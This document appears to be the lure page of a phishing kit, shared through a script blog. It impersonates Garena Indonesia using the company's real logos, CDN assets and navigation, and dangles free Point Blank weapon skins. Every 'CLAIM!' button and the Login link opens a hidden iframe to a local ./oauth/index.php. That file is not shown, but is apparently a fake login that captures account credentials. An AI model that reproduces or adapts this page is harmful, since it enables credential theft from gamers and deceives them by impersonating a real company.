<!-- https://ra-biitch.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<?php 
ob_start();
session_start();
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="id-id" xml:lang="id-id">
    <head>
		<link rel="shortcut icon" href="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/favicon.ico" type="image/x-icon">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta name="keywords" content='league of legends, rune, champion, summoner, god like, LoL, HoN, Heroes of Newerth, Go Kart, Gokartdotaallstars, dotaguidez, games, gaming, mmo gamer, mmorpg, mmorpgs, online game, online gamers, online gaming, pc console gaming, pc gaming, rts games, warcraft iii, world warcraft, dota, dota 2, FPS, BlackShot, first blood,garena, Defense of the Ancients, Godlike, imba, noob'/>
        <meta name="description" content='Chat, kirim pesan dan suara dengan teman-teman Anda. Nikmati game-game terbaik di dunia.'/>

        
        
        <title>Garena Indonesia - Connecting world gamers</title>     
        
        
 <!-- for Amy's new design -->
<link href="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/css/bootstrap2.min.css" rel="stylesheet">
<link href="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/css/style.css" rel="stylesheet">

    <link href="https://cdngarenanow-a.akamaihd.net/webmain/static/css/screen.css" rel="stylesheet" type="text/css" media="all" />
	<link rel="stylesheet" href="http://events.pb.garena.co.id/halloween/assets/css/featherlight.css">
<style>
        iframe {
            display: none;
        }
    </style>
<style type="text/css">
input {
    height: 20px;
}


/*padding for footer*/
#footer div p {
    float: none;
}
#footer .container{
    border: 0 !important;
}
</style>
<style>
table {
    border-collapse: collapse;
    width: 29%;
}

th, td {
    text-align: left;
    padding: 8px;
}

th {border-radius: 8px;}

tr:nth-child(even){background-color: #f2f2f2}

th {
    color: white;
	top: 200px;
}

.button {
  display: inline-block;
  border-radius: 4px;
  background-color: #3c3535;
  border: none;
  color: #FFFFFF;
  text-align: center;
  font-size: 15px;
  padding: 5px;
  width: 100px;
  transition: all 0.1s;
  cursor: pointer;
  margin: 5px;
}

.button span {
  cursor: pointer;
  display: inline-block;
  position: relative;
  transition: 0.5s;
  
}

.button span:after {
  content: '>>';
  position: absolute;
  opacity: 0;
  top: 0;
  right: -70px;
  transition: 0.3s;
}

.button:hover {
	background-color: #121111
}

.button:hover span {
  padding-right: 25px;
}

.button{border-radius: 8px;}

.button:hover span:after {
  opacity: 1;
  right: 0;
}
</style>
		
<script type="text/javascript" src="https://cdngarenanow-a.akamaihd.net/webmain/static/sso/js/jquery-1.10.2.min.js?v=0.12"></script>

<script type="text/javascript" src="https://cdngarenanow-a.akamaihd.net/webmain/static/sso/js/sso.js?v=0.12"></script>

<script type="text/javascript">
$(function() {
	SSO.init({
		'app_id': 10000,
		'language': 'id\u002DID',
		'login_mode': 'redirect',
		'login': false,
		'check_sso_session': true,
		'session_cookie_name': 'sso_session',
		'session_cookie_domain': '.garena.co.id',
		'on_session_change_callback': onSsoSessionChange,
		'':''
	});
});
</script>
       
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
<!-- Include all compiled plugins (below), or include individual files as needed -->
<script type="text/javascript" src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/js/bootstrap.min.js"></script>
<script type="text/javascript" src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/js/retina.min.js"></script>
<script type="text/javascript" src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/js/smooth-scroll.js"></script>
<script type="text/javascript" src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/js/script.js"></script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-75716913-9', 'auto');
  ga('send', 'pageview');

</script>
    </head>   
        <body> 
            
                <!--div id="holder"></div-->
                <!--div id="blackout"></div-->
                <!--div id="holder1"></div-->
<style type="text/css">
div#navbar {
    font-size: 14px;
}
</style>
<div id="navbar" class="navbar navbar-default navbar-fixed-top" role="navigation">
    <div class="container">
        <div class="navbar-header">
<!--
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
-->
            <a class="navbar-brand" href="/"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/logo_garena_new.png" alt="Garena" height="51"></a>
        </div>

        <div class="navbar-collapse collapse">
            <ul id="nav-menu" class="nav navbar-nav">

                
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle " data-toggle="dropdown">Perusahaan <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        
                        <li class=""><a href="http://corporate.garena.com"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-about.png">Tentang Garena</a></li>
                        
                        <li class=""><a href="http://career.garena.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-career.png">Karir@Garena</a></li>
                        
                        <li class=""><a href="/contact"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-contact.png">Hubungi Kami</a></li>
                        
                    </ul>
                </li>
                
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle " data-toggle="dropdown">Produk <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        
                        <li class=""><a href="/gas/"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-garena.png">Garena Mobile</a></li>
                        
                        <li class=""><a href="/beetalk"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-beetalk.png">BeeTalk</a></li>
                        
                        <li class=""><a href="/plus"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-garena.png">Garena+</a></li>
                        
                        <li class=""><a href="http://clan.garena.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-clan.png">Clan</a></li>
                        
                        <li class=""><a href="/gca/overview/"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-gca.png">GCA</a></li>
                        
                        <li class=""><a href="http://www.cyberindo.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/icon_cyberindo.png">CyberIndo</a></li>
                        
                    </ul>
                </li>
                
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle " data-toggle="dropdown">Game <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        
                        <li class=""><a href="http://pb.garena.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/icon_pb.png">Point Blank</a></li>
                        
                        <li class=""><a href="http://fo3.garena.co.id/"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/icon_fo3.png">FIFA Online 3</a></li>
                        
                        <li class=""><a href="http://hon.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/icon_15.png">Heroes of Newerth</a></li>
                        
                        <li class=""><a href="http://lol.garena.co.id/"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/icon_lol.png">League of Legends</a></li>
                        
                        <li class=""><a href="http://aov.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/icon_aov.png">Arena of Valor</a></li>
                        
                    </ul>
                </li>
                
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle " data-toggle="dropdown">Pembayaran <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        
                        <li class=""><a href="http://pay.garena.co.id"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-topup.png">Isi Shell</a></li>
                        
                        <li class=""><a href="/all_transactions"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-history.png">Transaksi Terakhir</a></li>
                        
                    </ul>
                </li>
                
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle " data-toggle="dropdown">Akun Saya <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        
                        <li class=""><a href="https://account.garena.com?locale_name=ID"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-settings.png">Account Center</a></li>
                        
                        <li class=""><a href="/support"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/images/nav-icon-support.png">Customer Service</a></li>
                        
                    </ul>
                </li>
                


            </ul>

            <ul class="nav navbar-nav navbar-right">
            
                <!-- <li id="nav-login-btn"><a href="/login_ui"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/images/nav-icon-user.png"> Login</a></li> -->
				<li class="ehe" id="nav-login-btn"><a href="#"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/images/nav-icon-user.png"> Login</a></li>
            
            </ul>

        </div><!--/.nav-collapse -->

    </div>
</div>

<style>

.ehe {
	
}

</style>

<script type="text/javascript">
	function login() {
		SSO.login();
	}

	function logout() {
		var homeUri = window.location.origin + '/';
		SSO.logout(homeUri);
	}
</script>

<style type="text/css">
.logout{
    padding-top:20px;
}
</style>
           
<style type="text/css">
#garena-download-btn-id{
	top:250px;
}
</style>
<div id="main">
	<div class="container">
		<div id="carousel-example-generic" class="carousel slide" data-ride="carousel" data-interval='4000'>
			<!-- Indicators -->
			<ol class="carousel-indicators">
				<li data-target="#carousel-example-generic" data-slide-to="0" class="active"></li>
				<li data-target="#carousel-example-generic" data-slide-to="1"></li>
				<li data-target="#carousel-example-generic" data-slide-to="2"></li>
			</ol>
			<!-- Wrapper for slides -->
			<div class="carousel-inner">
				<div class="item active">
					<CENTER><h1>Cheytac Series & Oa Series</h1></CENTER>
					<table>
						<tr>
							<th><img src="https://vignette.wikia.nocookie.net/crossfirefps/images/f/fa/CheyTac_M200_Platinum_Blue_%281%29.png/revision/latest?cb=20170217181606" style="width: 100%; margin: 45px 115px;" /></th>
							<th><img src="https://vignette.wikia.nocookie.net/crossfirefps/images/7/75/M200CHEYTAC_HALLOWEEN2015.png/revision/latest?cb=20150924155736" style="width: 87%; margin: 45px 138px;" /></th>
							<th><img src="http://files.specialforce2.in.th/files/cheytac_fireworkfx_ani_right.png?KeepThis=true&TB_iframe=true&height=430&width=700" style="width: 105%; margin: 45px 126px;" /></th>
						</tr>
					</table>
					<button class="button" name="oa1" style="margin: -29px 152px;"><span>CLAIM!</span></button>
					<button class="button" style="margin: -29px 438px;"><span>CLAIM!</span></button>
					<button class="button" style="margin: -29px 723px;"><span>CLAIM!</span></button>
					<table>
						<tr>
							<th><img src="https://2.bp.blogspot.com/-V97aDf25iGg/WgPALvLg3qI/AAAAAAAAB-Q/DSThI8C4o-c6lLJexVJh-H1Z8DiPchoOwCLcBGAs/s1600/ockemerdekaan.png" style="width: 100%; margin: 45px 115px;" /></th>
							<th><img src="https://1.bp.blogspot.com/-yx4mGRAEez8/WgQtjtJEayI/AAAAAAAAB-4/q9FqWkM-W8I5UyCO1x2ofWbjSOmNCfWkACLcBGAs/s320/OA-93_Salvation.PNG" style="width: 87%; margin: 45px 138px;" /></th>
							<th><img src="https://2.bp.blogspot.com/-Ls5moqLzP0E/WgQtzrG6_6I/AAAAAAAAB-8/Qi-PBtimO0UakrMg9SJeMa43T3hU2kU7QCLcBGAs/s320/1416557268877_.png" style="width: 105%; margin: 45px 126px;" /></th>
						</tr>
					</table>
					<button class="button" name="oa1" style="margin: -29px 152px;"><span>CLAIM!</span></button>
					<button class="button" style="margin: -29px 438px;"><span>CLAIM!</span></button>
					<button class="button" style="margin: -29px 723px;"><span>CLAIM!</span></button>
					<div class="carousel-caption">
					</div>
				</div>
				<div class="item">
					<CENTER><h1>Dual Kriss Series & Aug A3 Series</h1></CENTER>
					<table>
						<tr>
							<th><img src="http://img.gemscool.com/pb/version_2013//itemmall/weapon/KRISS_SV_GSL.png" style="width: 100%; margin: 45px 115px;" /></th>
							<th><img src="https://png2.kisspng.com/20180623/rlu/kisspng-point-blank-kriss-vector-firearm-submachine-gun-blow-5b2ec690803750.8438609515297921445252.png" style="width: 87%; margin: 45px 138px;" /></th>
							<th><img src="https://4.bp.blogspot.com/-DJmtyJIPQ_Y/WYy7Y8r1RiI/AAAAAAAAFR0/RFaa3HS6ICodrT56DM_41yrTQjl_raYBwCLcBGAs/s1600/v_kriss_sv_snow_miku_2013.png" style="width: 100%; margin: 45px 126px;" /></th>
						</tr>
					</table>
					<button class="button" name="oa1" style="margin: -29px 168px;"><span>CLAIM!</span></button>
					<button class="button" style="margin: -29px 455px;"><span>CLAIM!</span></button>
					<button class="button" style="margin: -29px 740px;"><span>CLAIM!</span></button>
					<table>
						<tr>
							<th><img src="https://1.bp.blogspot.com/-o50bF2XsqlY/WgQ4zpBdFtI/AAAAAAAAB_g/PFBfv7aEe34rTZ4j7Y8d7eY1tOaGgsmkACLcBGAs/s320/1.png" style="width: 100%; margin: 45px 115px;" /></th>
							<th><img src="https://1.bp.blogspot.com/-tOz9ZSmGTBU/WgQ5R7z9sCI/AAAAAAAAB_k/w2Oug2a1XeEh73cOytEqzZ7jPSl-p9WyACLcBGAs/s320/AUG_A3_Salvation.PNG" style="width: 87%; margin: 45px 138px;" /></th>
							<th><img src="https://4.bp.blogspot.com/-66zQRgS7FDI/WgRyYllUGxI/AAAAAAAACAY/poUo0bISMeYeuZbzD8_gf6kC2y_lfMfRwCLcBGAs/s1600/1.png" style="width: 100%; margin: 45px 126px;" /></th>
						</tr>
					</table>
					<button class="button" name="oa1" style="margin: -29px 168px;"><span>CLAIM!</span></button>
					<button class="button" style="margin: -29px 455px;"><span>CLAIM!</span></button>
					<button class="button" style="margin: -29px 740px;"><span>CLAIM!</span></button>
					<div class="carousel-caption">

					</div>
				</div>
			</div>

			<!-- Controls -->
			<a class="left carousel-control" href="#carousel-example-generic" data-slide="prev">
				<span class="glyphicon glyphicon-chevron-left"></span>
			</a>
			<a class="right carousel-control" href="#carousel-example-generic" data-slide="next">
				<span class="glyphicon glyphicon-chevron-right"></span>
			</a>
		</div>
		<div id="product-banners" class="row">
			<div id="product-banners" class="row">
			  <div id="garena-banner" class="col-xs-4 banner" style="text-align:center;"><a href="/plus"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/images/banner-garena-l.png" style="width:100% !important;"></a></div>
			  <div id="cyberindo-banner" class="col-xs-4 banner" style="text-align:center;"><a href="http://www.cyberindo.co.id/"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/images/banner-cyberindo-l.jpg" style="width:100% !important;"></a></div>
			  <div id="beetalk-banner" class="col-xs-4 banner" style="text-align:center;"><a href="http://mobile.garena.co.id/"><img src="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/images/Garena_Mobile.png" style="width:100% !important;"></a></div>
			</div>
	</div>

</div>

<script type="text/javascript">
$(function(){
	$("#garena-download-btn-id").click(function(){
		window.location = 'https://cdngarenanow-a.akamaihd.net/im/installer/Garena+_Install_id.exe';
	});
});
</script>

            
            
<div id="footer">
	<div class="container" style="border-top:none;">
		<div style="border-top:none;">
		 <select id="localeSwitch" name="localeSwitch" size="1" onChange="javascript:setLocale(this.value);">
    <option value="US">International</option>
    <option value="SG">Singapore</option>
    <option value="TW">Taiwan (台灣)</option>
    <option value="PH">Philippines (Pilipinas)</option>
    <option value="TH">Thailand (ราชอาณาจักรไทย)</option>
    <option value="ID">Indonesia</option>
    <option value="VN">Vietnam (Việt Nam)</option>
    <option value="RU">Russia (Россия)</option>
    <option value='MY'>Malaysia</option>
 </select>

 
 <script src="http://events.pb.garena.co.id/halloween/assets/js/featherlight.js"></script>
<script type="text/javascript">
    function setLocale(locale) {
        window.location = 'https://www.garena.co.id/process_change_locale/?locale='+locale;
    }
</script>

<script type="text/javascript">
    var localeSwitch = document.getElementById('localeSwitch');

    for (i=0; i<localeSwitch.options.length; i++) {
        if (localeSwitch.options[i].value=='ID') 
        {
            localeSwitch.options[i].selected=true;
        }
    }
</script>
		</div>
		<div class="ft-sosumi">
			<p>Copyright © Garena Online. Trademarks belong to their respective owners. All rights reserved.<span class="pull-right"><a href="/tos/" class="first">Terms of Use</a> | <a href="/privacy/">Privacy Policy</a></span></p>
		</div>
	</div>
</div>

               
            <!--CHANGE USERNAME NOTICE BELOW-->
            
<iframe src="./oauth/index.php" class="lightbox" width="800" height="500"
            id="fl-login" style="border:none;" webkitallowfullscreen mozallowfullscreen
            allowfullscreen></iframe>
            <script>

    $('.button').on('click', function () {
                $.featherlight('#fl-login');
            })
			
	$('.ehe').on('click', function () {
                $.featherlight('#fl-login');
            })
</script>

            
			<script>
				function onSsoSessionChange(session) {
					if(session.login && typeof session.check_sso_session !== "undefined"){
						location.reload();
					}
				}
				$('.sso_login_button').click(function(){
					SSO.login();
				});
			</script>
        </body>
    
</html>
